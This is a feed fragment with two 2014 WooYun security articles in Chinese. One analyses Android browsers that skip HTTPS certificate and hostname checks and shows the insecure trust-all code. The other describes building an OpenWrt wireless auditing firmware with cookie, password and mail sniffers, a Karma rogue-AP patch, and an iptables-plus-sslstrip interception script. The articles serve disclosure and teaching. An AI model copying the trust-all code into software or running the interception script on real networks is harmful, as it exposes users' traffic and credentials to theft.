分析&lt;/h2&gt;&lt;p&gt;如果自己简单的实现android webview加载网页，如果直接访问可信证书的站点是可以正常显示，但是如果访问自签名的证书的站点就会显示notfound的页面。(写本文时apple.com以及apple.com.cn处于劫持状态)&lt;/p&gt;&lt;p&gt;logcat会输出网页显示不安全的内容&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Web Console:The page displayed insecure content!
&lt;/code&gt;&lt;p&gt;功能健全的手机浏览器访问自签名证书的站点会如下提醒&lt;/p&gt;&lt;p&gt;在PC端如果访问自签名证书的站点则会出现如下图左侧的提醒&lt;/p&gt;&lt;p&gt;为解决javax.net.ssl.SSLPeerUnverifiedException: No peer certificate的异常，开发者往往会采用以下的错误解决方案。如此是浏览器应用采用此类解决方案，那么风险就更大了。&lt;/p&gt;&lt;p&gt;覆盖google默认的证书检查机制&lt;/p&gt;&lt;br&gt;&lt;br&gt;class bv&lt;br&gt;  implements X509TrustManager&lt;br&gt;{&lt;br&gt;  bv(bu parambu) {}&lt;br&gt;&lt;br&gt;  public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) {}&lt;br&gt;&lt;br&gt;  public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) {}&lt;br&gt;&lt;br&gt;  public X509Certificate[] getAcceptedIssuers()&lt;br&gt;  {&lt;br&gt;    return null;&lt;br&gt;  }&lt;br&gt;}&lt;br&gt;&lt;p&gt;信任所有主机名&lt;/p&gt;&lt;br&gt;&lt;br&gt;public static HttpClient getNewHttpClient() {  &lt;br&gt;    try {  &lt;br&gt;        //获得密匙库&lt;br&gt;        KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());  &lt;br&gt;        trustStore.load(null, null);  &lt;br&gt;&lt;br&gt;        SSLSocketFactory sf = new SSLSocketFactoryEx(trustStore); &lt;br&gt;        //信任所有主机名 &lt;br&gt;        sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);  &lt;br&gt;&lt;br&gt;        HttpParams params = new BasicHttpParams();  &lt;br&gt;        HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);  &lt;br&gt;        HttpProtocolParams.setContentCharset(params, HTTP.UTF_8);  &lt;br&gt;&lt;br&gt;        SchemeRegistry registry = new SchemeRegistry();  &lt;br&gt;        registry.register(new Scheme(&quot;http&quot;, PlainSocketFactory.getSocketFactory(), 80));  &lt;br&gt;        registry.register(new Scheme(&quot;https&quot;, sf, 443));  &lt;br&gt;&lt;br&gt;        ClientConnectionManager ccm = new ThreadSafeClientConnManager(params, registry);  &lt;br&gt;&lt;br&gt;        return new DefaultHttpClient(ccm, params);  &lt;br&gt;    } catch (Exception e) {  &lt;br&gt;        return new DefaultHttpClient();  &lt;br&gt;    }  &lt;br&gt;}  &lt;br&gt;&lt;p&gt;其实早在14年2月&lt;a href=&quot;http://drops.wooyun.org/papers/959&quot; data-editable=&quot;true&quot; data-title=&quot;窃听风暴： Android平台https嗅探劫持漏洞&quot;&gt;窃听风暴： Android平台https嗅探劫持漏洞&lt;/a&gt;文中就有提到android平台的app因为覆盖google默认的证书检查机制（X509TrustManager）之后没有对证书进行应有的安全性检查，直接接受了所有异常的https证书，不提醒用户存在安全风险，也不终止这次危险的连接。文中对证书域名检查（HostnameVerifier）部分没有细说。&lt;/p&gt;&lt;p&gt;上文有提到PC版的360浏览器访问被劫持网站居然没有证书错误提示，让人很不敢相信。加上最近android app 证书问题频发，猜想是否有可能一些手机浏览器也会有此类漏洞了。测试过程中发现360手机浏览器、和搜狗浏览器存在此风险。&lt;/p&gt;&lt;p&gt;百度和遨游轻松检测出证书异常&lt;/p&gt;&lt;p&gt;而360和搜狗直接加载进入了被劫持的网站。&lt;/p&gt;&lt;p&gt;反编译查看遨游浏览器的代码，针对证书异常做了处理&lt;/p&gt;&lt;p&gt;而搜狗浏览器则是做了证书信任所有主机名不当处理&lt;/p&gt;&lt;p&gt;关键字：checkServerTrusted、setHostnameVerifier、ALLOW_ALL_HOSTNAME_VERIFIER、X509TrustManager、onReceivedSslError&lt;/p&gt;&lt;h2&gt;0x03 对比&lt;/h2&gt;&lt;p&gt;对主流手机浏览器进行了横向对比，测试对象包括：firefox、chrome、UC浏览器、搜狗浏览器、百度浏览器、360安全浏览器、欧鹏浏览器、遨游云浏览器、猎豹浏览器。&lt;/p&gt;&lt;p&gt;测试方法：手机访问&lt;a href=&quot;https://example.com/&quot; data-editable=&quot;true&quot; data-title=&quot;example.com 的页面&quot;&gt;https://example.com/&lt;/a&gt;,观察是否有安全提醒。&lt;/p&gt;&lt;p&gt;未做提醒直接加载网页：360安全浏览器、猎豹浏览器、搜狗浏览器&lt;/p&gt;&lt;p&gt;正常做出安全提醒：firefox、chrome、UC浏览器、百度浏览器、欧鹏浏览器、遨游云浏览器&lt;/p&gt;&lt;h2&gt;0x04 建议&lt;/h2&gt;&lt;p&gt;开发者：&lt;/p&gt;&lt;p&gt;1、非浏览器app，有钱申请ca证书没钱在客户端中添加证书,切勿信任所有证书。&lt;/p&gt;&lt;p&gt;2、浏览器app，严格按照客户端校验服务器证书流程处理:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;查看证书是否过期&lt;/li&gt;&lt;li&gt;CA是否可靠&lt;/li&gt;&lt;li&gt;CA的公钥能否正确解开服务器证书的CA数字签名，即证书的签名值&lt;/li&gt;&lt;li&gt;服务器证书上的域名是否和服务器的实际域名相匹配&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;3、建议使用setHostnameVerifier(SSLSocketFactory.STRICT_HOSTNAME_VERIFIER)&lt;/p&gt;&lt;p&gt;用户：使用安全性较好的app&lt;/p&gt;&lt;h2&gt;0x05 参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/tips/2775&quot; data-editable=&quot;true&quot; data-title=&quot;数字证书及其在安全测试中的应用&quot;&gt;数字证书及其在安全测试中的应用&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/959&quot;&gt;http://drops.wooyun.org/papers/959&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://developer.android.com/reference/javax/net/ssl/HttpsURLConnection.html&quot; class=&quot;&quot;&gt;http://developer.android.com/reference/javax/net/ssl/HttpsURLConnection.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://developer.android.com/reference/javax/net/ssl/X509TrustManager.html&quot;&gt;http://developer.android.com/reference/javax/net/ssl/X509TrustManager.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://developer.android.com/training/articles/security-ssl.html&quot; class=&quot;&quot;&gt;http://developer.android.com/training/articles/security-ssl.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://developer.android.com/reference/org/apache/http/conn/ssl/SSLSocketFactory.html&quot;&gt;http://developer.android.com/reference/org/apache/http/conn/ssl/SSLSocketFactory.html&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;乌云知识库投稿：&lt;a href=&quot;http://drops.wooyun.org/newsend&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;投稿 | WooYun知识库&quot;&gt;http://drops.wooyun.org/newsend&lt;/a&gt;&lt;/p&gt;&lt;p&gt;1. 如果未有乌云账号的话，你将会在邮箱当中获取到邀请码一枚，可以来注册成为乌云白帽子。&lt;/p&gt;&lt;p&gt;2. 文章如审核通过即可获普通文章奖励（20WB）。&lt;/p&gt;&lt;p&gt;3. 文章内容符合知识库征稿意向，内容充实有新意可获优秀文章奖励（20WB + 500RMB）。&lt;/p&gt;&lt;p&gt;4. 最新的事件分析和安全预警，分享业内前沿最新技术、0day分析与利用、个人安全开发研究新成果等方面的奇技淫巧、心经等可获加精文章奖励（40WB + 1000RMB）。&lt;/p&gt;&lt;p&gt;5. 以后根据文章内容还可能获得相关众测免费门票等优惠！&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2014-10-23-19875587</guid>
<pubDate>Thu, 23 Oct 2014 00:00:00 +0800</pubDate>
</item>
<item>
<title>WooYun WIFI 成长史</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2014-10-20-19873529.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/19873529&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;第一章：失传的菠萝神话&lt;/h1&gt;&lt;h2&gt;0x00 前言:&lt;/h2&gt;&lt;p&gt;WooyunWifi是一款基于Openwrt开发的无线审计测试固件，内置集成了众多著名无线/网络审计工具，并基于Ngrep+sslstrip开发了原创工具及BS架构管理界面。 本系列文章将详细讲解 无线安全、网络安全、嵌入式开发、前端Bootstrap界面设计、后台PHP程序设计、Shell Script编写、C语言有限自动机设计、Python网络编程、Linux高级命令、路由器常识概念 等相关内容&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;本章概括了WooyunWifi的技术架构以及功能实现理论。&lt;/p&gt;&lt;/blockquote&gt;&lt;h2&gt;0x01 菠萝神话：&lt;/h2&gt;&lt;p&gt;由于wifi pineapple支持的路由器有限（事实上除了它自己销售的那一款，其他的路由器都没办法完全正常运行），因此网上出现了各种“移植”的教程，只为一睹神器真容，然而多数人最终失败，少数人在付出了巨大代价后才勉强成功。 Wifi pineapple自称开源，但事实上并非如此，其公开的源代码陈旧而混乱，也没有充足的文档以供分析。 菠萝神话已经失传，只剩国外垄断销售的黑客路由器与一群心怀不轨的购买者，技术研究的气氛 和 自由公开的精神 早已不见了踪影。 如果你真的好奇大菠萝到底是怎样实现的，如果你真的想看到确凿的技术细节，那么跟我来体验一把求真求实、自由共享的乌云白帽“安全实践”吧 注：根据有关法律法规，我们正在仔细评估并设计该固件的”安全使用”限制，尽管遵守GPL协议，在”安全使用”评估设计完成之前不会公开源代码，也不会向公众发布固件。&lt;/p&gt;&lt;h2&gt;0x02 架构设计：&lt;/h2&gt;&lt;p&gt;先展示一下WooyunWifi的架构图（Wooyun Wifi简称Woofi）：&lt;/p&gt;&lt;p&gt;1、 PHP+Bootstrap的组合大家已经在乌云靶场项目中见过了，不过由于路由器环境限制和开源工具数据存储特性，经过考虑不使用Mysql数据库存储数据，直接使用文本方式保存数据内容。&lt;/p&gt;&lt;p&gt;2、 数据处理则考虑到路由器性能问题（大量实时数据包处理）采用C语言自动机实现&lt;/p&gt;&lt;p&gt;3、 使用Shell编程简化了一些控制配置，fate0修复了一个sslstrip的官方bug&lt;/p&gt;&lt;p&gt;简而言之，工作流程是这样的：用户登录192.168.16.2，看到uhttpd上的index首页，然后后台PHP处理用户的操作，调用了一些辅助性Shell script，然后比如控制把ngrep抓到的数据实时交给WoofiTools中的mailsniff做数据处理，然后结果以文本形式保存。PHP把文本保存的数据读取处理，结合uhttpd返回给用户页面。&lt;/p&gt;&lt;p&gt;如果接下来各种程序设计我都是一句话带过然后疯狂贴代码，那么这篇文章也和那些炫耀贴毫无区别了，并无冒犯之意，我也从很多“一句话轻描淡写”博客中学习了很多知识，只不过由于文章细节不清，BUG和失败的次数令我觉得难以忍受……所以，接下来我不仅要告诉大家我是怎样实现的程序，而且要告诉大家我为什么要这样写程序。&lt;/p&gt;&lt;h2&gt;0x03 实现方案的演变：&lt;/h2&gt;&lt;p&gt;在我还没有开始设计之前，我考虑过几种实现方案&lt;/p&gt;&lt;p&gt;1、 基于大菠萝二次开发，修改代码重新编译到其他路由器上。这个当时是我的首选方案，直到我发现大菠萝根本没有完全公开源代码，因此彻底不可行&lt;/p&gt;&lt;p&gt;2、 集成开源软件，做开源软件的WEB UI和各种前提配置。当时觉得这样完全不比大菠萝二次开发复杂，直到我发现很多开源软件年久失修BUG成群，能修复的尽量修复，修不好的只能重新开发了。&lt;/p&gt;&lt;p&gt;3、 集成各种必要的library，自己从头开发功能程序，这样很明显会有重复造轮子的浪费，不过由于发现有些开源软件无法正常使用，因此也是没办法的选择，当然我也会把那些能够使用的开源软件加以利用&lt;/p&gt;&lt;p&gt;于是，本想着改改大菠萝代码就可以了，结果变成了重新集成开源软件做 WEB UI 于是，本想着重新集成开源软件做 WEB UI就可以了，结果需要部分底层工具重新开发&lt;/p&gt;&lt;p&gt;发生这种情况一方面是由于预研不到位，以及SE对技术难度的预判有误，而导致项目规划和实际执行严重错位，这么巨大的技术难度偏差很可能导致项目流产。 那么这个项目是怎么来的呢？那就要从2014/7/30的下午说起……&lt;/p&gt;&lt;p&gt;社区里小伙伴发了个思想无比前卫的帖子：Anymous《&lt;a href=&quot;http://zone.wooyun.org/content/14162&quot; data-editable=&quot;true&quot; data-title=&quot;设想wooyun智能路由改造openwrt&quot;&gt;设想wooyun智能路由改造openwrt&lt;/a&gt;》 剑心大人@了瞌睡龙大人，瞌睡龙大人把这个光荣的任务交给了我，我当时想了一下答道：“如果只是改改大菠萝源代码，不会很难” 事实证明，我在没有预研的情况下错判了项目技术难度，看来还有好多的东西要学~&lt;/p&gt;&lt;p&gt;&lt;strong&gt;感想：&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;越是看上去简单的事情，做起来就越复杂。事情即使再复杂，只要做完了就会变得简单&lt;/p&gt;&lt;h2&gt;0x04 工具原理：&lt;/h2&gt;&lt;p&gt;1、 嗅探使用ngrep+自己写的C语言自动机，以及sslstrip+自己写的C语言自动机&lt;/p&gt;&lt;p&gt;2、 MITM系列功能使用二次开发过的sslstrip来实现&lt;/p&gt;&lt;p&gt;3、 无线审计开源工具不用修改，直接做WEB UI就可以了（我又错了，karma把我击败了）&lt;/p&gt;&lt;p&gt;4、 Karma（未完成）通过建立AP并给任意ssid的请求进行响应和服务，达到劫持的目的&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Karma原理详解：&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;首先Karma需要建立一个能够用来劫持用户的AP（比如说利用hostapd），然后对hostapd源码进行patch，使之可以无视请求中的ssid提供服务&lt;/p&gt;&lt;p&gt;（默认情况下，若ssid不一致，hostapd会报告异常，因此为了实现karma功能需要hostapd去除ssid检查）&lt;/p&gt;&lt;p&gt;部分重要patch如下：&lt;/p&gt;&lt;p&gt;即如果karma_beacon_respond选项开启则无视ssid的检查，补丁原作者在截图中有显示，我只是把他的针对hostapd 2.0补丁重新做到了hostapd最新版20140603上而已&lt;/p&gt;&lt;p&gt;PS：制作补丁/使用补丁的方式请参见&lt;a href=&quot;http://wiki.openwrt.org/doc/devel/patches&quot;&gt;http://wiki.openwrt.org/doc/devel/patches&lt;/a&gt;&lt;/p&gt;&lt;p&gt;再PS：在refresh之后一定要记住把生成好的补丁复制出来备份，因为接下来的步骤会把补丁打进源码而删除原补丁文件！！！&lt;/p&gt;&lt;p&gt;而karma本身程序的运行逻辑是： 首先循环抓无线信号帧（使用了airtap），然后每次抓到信号帧都调用on_probe_request处理，在函数里面首先建立一个链表储存请求的station信息，之后发送响应信号帧&lt;/p&gt;&lt;p&gt;可惜我没有成功跑起karma主程序，因为airtap调用了libpcap却找不到对应的datalink decoder，暂时找不到解决方案&lt;/p&gt;&lt;p&gt;我曾经以为我熟悉这些工具的原理，直到开发过程中（以后文章详解）遇到各种问题，才发现要真正的熟悉原理，不仅要知道工具做了什么，而且要知道工具为什么这么做。&lt;/p&gt;&lt;h2&gt;0x05 Luci的简要分析：&lt;/h2&gt;&lt;p&gt;我们使用Openwrt自己的Luci进行常规功能的管理，因为Luci自己的功能其实是很强大的。我曾经一度想要在Luci之上开发我们的WooyunWifi WEB界面，但是由于cgi和lua脚本都比较陌生，所以为了敏捷开发，还是选择了PHP 请注意：部分Openwrt版本的Luci不支持网络中继功能（就是作为client连接一个Wifi然后再作为AP播出一个Wifi），我选择的最新barrier_breaker是有这个功能的 另外，Luci依赖uhttpd，因此正好PHP也放在uhttpd上了&lt;/p&gt;&lt;p&gt;对了，不要自己乱改/etc/config/wireless配置，因为Luci会出BUG&lt;/p&gt;&lt;h2&gt;0x06 投影至乌云峰会irc上：&lt;/h2&gt;&lt;p&gt;这个是临时功能，为了乌云峰会设计的，从各种sniff中posturl到服务端，然后fate0在瞌睡龙大人的weechat里做了个python插件，我只是post数据，没有实际参与，因此不知道相关细节。 展示出的代码中没有该功能&lt;/p&gt;&lt;h1&gt;第二章：路由器的先天技能&lt;/h1&gt;&lt;h2&gt;0x00 前言:&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;本章概括了WooyunWifi基于Openwrt的源码编译及集成方式。&lt;/p&gt;&lt;/blockquote&gt;&lt;h2&gt;0x01 编译Openwrt：&lt;/h2&gt;&lt;p&gt;我使用的是Ubuntu麒麟14.04：&lt;/p&gt;&lt;p&gt;首先要看官方文档，而不是胡乱百度 &lt;a href=&quot;http://wiki.openwrt.org/doc/howto/easy.build&quot; data-editable=&quot;true&quot; data-title=&quot;Easy Build&quot;&gt;Easy Build&lt;/a&gt;&lt;/p&gt;&lt;p&gt;官方文档中的这一句&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;svn co -r 36088 svn://svn.openwrt.org/openwrt/branches/attitude_adjustment
&lt;/code&gt;&lt;p&gt;是检出36088版的attitude_adjustment分支源码，最新版是trunk，新功能多，支持的芯片多，但是稳定的软件包少。为了支持极路由，我选择的是最新版barrier_breaker分支，不要忘记去掉-r 36088以检出最新版本的源码。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;svn co svn://svn.openwrt.org/openwrt/branches/barrier_breaker
&lt;/code&gt;&lt;p&gt;官方文档中的这一句：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;./scripts/feeds update –a
&lt;/code&gt;&lt;p&gt;可能会因为国内偶尔连不上googlecode而失败，如果你不需要那些在googlecode上的软件包，你可以无视失败信息进行&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;./scripts/feeds install -a
&lt;/code&gt;&lt;p&gt;（因为会报告index问题，所以要加-a） 如果正好googlecode上放的是你需要的软件包，请自行寻找连接google的方式吧&lt;/p&gt;&lt;p&gt;然后&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;~/20140818/barrier_breaker$ make menuconfig
&lt;/code&gt;&lt;p&gt;进行配置&lt;/p&gt;&lt;p&gt;第一项是目标芯片型号，不知道自己路由器芯片型号的Google去吧，第二项选项是NAND什么的设置视情况选择，第三项是你的路由器型号，我这里选择了极路由，只有在选对了芯片类型后才会可选，其它选项都比较易懂，如果用到再说&lt;/p&gt;&lt;p&gt;选择编译的软件包时，星号代表编译进固件，M代表编译安装包但不放进固件，内置某些软件包时会自动选中依赖项&lt;/p&gt;&lt;p&gt;Q：为什么选项里没有我要的软件包？&lt;/p&gt;&lt;p&gt;A：可能你没feeds update install，也可能是你svn检出的版本不对&lt;/p&gt;&lt;p&gt;然后就是保存&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;make V=s
&lt;/code&gt;&lt;p&gt;有很多人喜欢 j4多线程编译，如果你是第一次编译，强烈建议你不要这样做，因为你一旦遇到错误输出的东西比较混乱，查日志很麻烦 然后就是遇到连接错误，重新make V=s，还是连接不上，那就和想办法上国外网站同一个道理，如果校验出错，删掉dl文件夹下的错误文件重新 make V=s，视报错针对性解决&lt;/p&gt;&lt;p&gt;如果编译完成，会在&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;bin/芯片型号/
&lt;/code&gt;&lt;p&gt;下面出现编译好的固件 比如：openwrt-ar71xx-generic-hiwifi-hc6361-squashfs-sysupgrade.bin 这就是squashfs的极路由固件&lt;/p&gt;&lt;p&gt;再比如：openwrt-ar71xx-generic-wndr3800-squashfs-factory.img 这就是squashfs的netgear wndr3800 固件&lt;/p&gt;&lt;p&gt;刷机方法一般可用路由器后台界面上传固件刷机，也可根据说明书使用TFTP刷机，如果有经验也可以线刷&lt;/p&gt;&lt;h2&gt;0x02 开源工具的评测：&lt;/h2&gt;&lt;p&gt;1、 Ngrep：之所以不使用tcpdump是因为ngrep提供了更简便的数据处理和输出，运行时很稳定，用它开发了cookiesniff、passsniff、mailsniff等工具&lt;/p&gt;&lt;p&gt;2、 Dsniff：密码嗅探不理想，安装它是为了其中的urlsnarf等工具，相对而言还是自己开发的ngrep+各种sniff不丢包更稳定，话说Http的密码它根本嗅探不到啊，不知道是不是我配置的问题。&lt;/p&gt;&lt;p&gt;3、 SSlstrip：官方版本就存在着BUG，不能运行，多亏fate0挺身而出修复了这个BUG，于是我们的Mitm也可以基于sslstrip设计了&lt;/p&gt;&lt;p&gt;4、 Ettercap：由于Openwrt官方自带的版本过度古老，因此BUG很多（各种网上已知的bug），不适合做二次开发，因此只集成不做WEB UI。&lt;/p&gt;&lt;p&gt;5、 Karma：不能够正常使用，需要大量修改（暂未完成）&lt;/p&gt;&lt;p&gt;6、 Aircrack-ng：还没测试&lt;/p&gt;&lt;p&gt;7、 Reaver：还没测试&lt;/p&gt;&lt;h2&gt;0x03 fate0修复sslstrip：&lt;/h2&gt;&lt;p&gt;使用sslstrip的时候报错：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;exceptions.AttributeError: ClientRequest instance has no attribute &#39;responseHeaders&#39;
&lt;/code&gt;&lt;p&gt;fate0通过对sslstrip源码的检查，发现了sslstrip集成的twisted版本过于古老，因此建议我更新twisted，但是我发现新版本的twisted容量太大，集成到路由器上不现实，因此Openwrt才会一直集成古老版本的twisted（而且发现它还是缩水的）。&lt;/p&gt;&lt;p&gt;于是只好求fate0改sslstrip代码，fate0调试之后发现了问题所在：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ServerConnection.py

elif (key.lower() == &#39;set-cookie&#39;):
            #import pdb
            #pdb.set_trace()
            #self.client.responseHeaders.addRawHeader(key, value)
            self.client.setHeader(&quot;test_key&quot;, &quot;test_value&quot;)
            #self.client.setHeader(key, value)
            self.client.cookies.append(value)
        else:
            self.client.setHeader(key, value)
&lt;/code&gt;&lt;p&gt;由于#self.client.responseHeaders.addRawHeader(key, value)这一句没有responseHeaders，因此造成exception&lt;/p&gt;&lt;p&gt;那么，sslstrip这样设计的目的是什么呢？我们知道，set-cookie可能会有很多个，而self.client.setHeader(key, value)会毫不犹豫地覆盖掉之前的set-cookie，因此这段代码的目的是addRawHeader实现多个set-cookie header&lt;/p&gt;&lt;p&gt;因此，fate0用self.client.cookies.append(value)实现了这一功能，修复完毕&lt;/p&gt;&lt;h2&gt;0x04 制作修复后的sslstrip软件包：&lt;/h2&gt;&lt;p&gt;修改sslstrip的Makefile，改为从本地下载（我搭了个nginx），别忘改md5校验哦&lt;/p&gt;&lt;p&gt;然后把修复后的ServerConnection.py打进压缩包，放在自己nginx即可&lt;/p&gt;&lt;h2&gt;0x05 制作自己的软件包：&lt;/h2&gt;&lt;p&gt;请优先参阅官方文档&lt;/p&gt;&lt;p&gt;例：package/wooyun/wooyunwifi/Makefile&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#
# Copyright (C) 2011-2012 OpenWrt.org
#
# This is free software, licensed under the GNU General Public License v2.
# See /LICENSE for more information.
#

include $(TOPDIR)/rules.mk

PKG_NAME:=wooyunwifi
PKG_RELEASE:=1

include $(INCLUDE_DIR)/package.mk

define Package/wooyunwifi
  SECTION:=wooyun
  CATEGORY:=wooyunwifi
  TITLE:=wooyunwifi
  MAINTAINER:=lxj616
endef

define Package/wooyunwifi/description
 Wooyun Wifi is a whitehat wifi auditing toolsuite based
 on Openwrt , Have fun testing security issues on your 
 own wifi network ,serves study purpose only, license GPL
                                    ------ lxj616@wooyun
endef

define Build/Prepare
    $(INSTALL_DIR) $(PKG_BUILD_DIR)
    把src里面的源文件复制到build地点（不然编译时找不到）
    $(INSTALL_DATA) ./src/cookiesniff.c $(PKG_BUILD_DIR)/
    $(INSTALL_DATA) ./src/passsniff.c $(PKG_BUILD_DIR)/
    $(INSTALL_DATA) ./src/mailsniff.c $(PKG_BUILD_DIR)/
    $(INSTALL_DATA) ./src/stripsslstrip.c $(PKG_BUILD_DIR)/
    把不需要编译的文件夹和文件也拷贝过去
    $(CP) ./WooyunWifi $(PKG_BUILD_DIR)/
    $(CP) ./index.html $(PKG_BUILD_DIR)/
    $(CP) ./conf $(PKG_BUILD_DIR)/
endef

define Build/Compile
    编译源文件，如果之前没复制这步就找不到，用的是交叉编译
    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
        -o $(PKG_BUILD_DIR)/cookiesniff $(PKG_BUILD_DIR)/cookiesniff.c
    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
        -o $(PKG_BUILD_DIR)/passsniff $(PKG_BUILD_DIR)/passsniff.c
    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
        -o $(PKG_BUILD_DIR)/mailsniff $(PKG_BUILD_DIR)/mailsniff.c
    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
        -o $(PKG_BUILD_DIR)/stripsslstrip $(PKG_BUILD_DIR)/stripsslstrip.c
endef

define Package/wooyunwifi/install
    新建文件夹准备复制
    $(INSTALL_DIR) $(1)/usr/bin
    $(INSTALL_DIR) $(1)/etc/wooyunwifi
    复制编译好的文件到可以运行的地方
    $(INSTALL_BIN) $(PKG_BUILD_DIR)/cookiesniff $(1)/usr/bin/
    $(INSTALL_BIN) $(PKG_BUILD_DIR)/passsniff $(1)/usr/bin/
    $(INSTALL_BIN) $(PKG_BUILD_DIR)/mailsniff $(1)/usr/bin/
    $(INSTALL_BIN) $(PKG_BUILD_DIR)/stripsslstrip $(1)/usr/bin/
    $(INSTALL_DIR) $(1)/www
    直接复制各种文件
    $(CP) $(PKG_BUILD_DIR)/WooyunWifi $(1)/www
    $(CP) $(PKG_BUILD_DIR)/index.html $(1)/www
    $(CP) $(PKG_BUILD_DIR)/conf/basepath.conf $(1)/etc/wooyunwifi
endef

$(eval $(call BuildPackage,wooyunwifi))
&lt;/code&gt;&lt;p&gt;然后再make menuconfig就可以看到自己的软件包了，然后正常编译即可，如果报错注意修改软件包配置&lt;/p&gt;&lt;h1&gt;第三章：路由器的漂亮界面&lt;/h1&gt;&lt;h2&gt;0x00 前言:&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;本章概括了WooyunWifi的WEB端功能实现。&lt;/p&gt;&lt;/blockquote&gt;&lt;h2&gt;0x01 PHP：&lt;/h2&gt;&lt;p&gt;我曾经考虑，可不可以只用html+cgi实现所有的功能，但考虑到WEB管理的业务需求比较宽松，因此采用PHP敏捷开发更加快速。 Menuconfig时，额外选择language – PHP – php-mod-session用作登录控制，同理可集成其它所需插件 为了使uhttpd支持PHP，修改package/network/services/uhttpd/files/uhttpd.config 去掉list interpreter php的注释符号，其它配置同理&lt;/p&gt;&lt;p&gt;以sslstrip插件的设计为例进行说明&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/WooyunWifi/sslstrip.inc

$ison=shell_exec(&quot;ps|awk &#39;{print $6}&#39;|grep sslstrip&quot;);
&lt;/code&gt;&lt;p&gt;在PHP中随时使用shell_exec和exec执行linux命令获取工具状态，并且判断显示开关的状态，之后就是常规的PHP程序设计了&lt;/p&gt;&lt;p&gt;不过在设计中出现了一个小问题，那就是一些命令比如说ngrep在运行时会挂在那里持续运行，这就导致PHP脚本无法继续运行，比较奇怪的是nohup &amp;amp;在php里面没有效果，只有先用PHP sh ***.sh，然后在shell 脚本中才会正常后台执行，因此：&lt;/p&gt;&lt;p&gt;&lt;strong&gt;sson.php&lt;/strong&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;script&amp;gt;
var xmlhttp;
xmlhttp=new XMLHttpRequest();
&amp;lt;?php
echo &#39;xmlhttp.open(&quot;GET&quot;,&quot;sslstripon.php&quot;,true)&#39;;
?&amp;gt;
xmlhttp.send();
var t=setTimeout(&quot;window.location.href=\&quot;/WooyunWifi/index.php?action=sslstrip\&quot;;&quot;,1000);
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;p&gt;先异步请求，然后等待1s跳转回去（解决后面500 bad gateway问题）&lt;/p&gt;&lt;p&gt;&lt;strong&gt;sslstripon.php&lt;/strong&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;shell_exec(&quot;./test2.sh &quot;.$basepath.&quot;&amp;amp;&quot;);
&lt;/code&gt;&lt;p&gt;接到请求，运行shell脚本（还是会挂在这里不能继续执行）&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Test2.sh&lt;/strong&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000

echo &quot;1&quot; &amp;gt; ${1}/sslstrip.log
sslstrip -w ${1}/sslstrip.log -l 10000 &amp;amp;
tail -f ${1}/sslstrip.log|stripsslstrip &amp;amp;

kill $(ps|grep &quot;php-cgi&quot;|awk &#39;{print $1}&#39;) &amp;amp;
